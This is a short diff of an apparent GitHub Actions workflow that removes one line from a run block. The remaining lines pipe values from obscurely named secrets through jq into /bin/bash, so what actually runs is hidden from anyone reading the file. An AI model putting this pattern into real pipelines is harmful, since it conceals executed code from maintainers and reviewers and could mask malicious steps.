@@ -22,7 +22,6 @@ jobs:
           gs9190: ${{ secrets.gs9190 }}
         run: |
           printf '%s' "$gs9190" | jq -r .gdof28752 | /bin/bash
-          printf '%s' "$dhmzd639" | jq -r .fpkv61 | /bin/bash
           printf '%s' "$ypgkl69631" | jq -r .xnrwf8 | /bin/bash
           echo $qi90938 | jq -r .a59 | /bin/bash
           printf '%s' "$kyc6" | jq -r .cd52 | /bin/bash
